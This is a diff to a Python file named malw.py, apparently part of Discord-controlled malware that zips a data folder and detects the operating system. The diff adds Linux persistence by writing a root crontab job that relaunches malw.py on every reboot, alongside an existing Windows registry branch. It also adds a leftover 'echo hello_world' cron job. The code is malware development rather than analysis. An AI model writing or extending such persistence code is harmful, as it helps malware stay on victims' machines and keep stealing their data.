@@ -14,7 +14,11 @@ from discord.ext import tasks
 import shutil #to zip the data folder
 import zipfile
 import platform
+from crontab import CronTab
 
+cron = CronTab(user='root')
+job = cron.new(command='echo hello_world')
+job.every_reboot()
 CURRENT_PATH = os.path.abspath(__file__).replace("malw.py","")
 
 # Discord Config
@@ -49,7 +53,11 @@ def OS_Detection():
             winreg.CloseKey(key)
             
     elif OS == "Linux":
-        pass
+        cron = CronTab(user = "root")
+        job = cron.new(command="python3 "+CURRENT_PATH+"malw.py")
+        job.every_reboot()
+        cron.write()
+        
 OS_Detection()
 
 
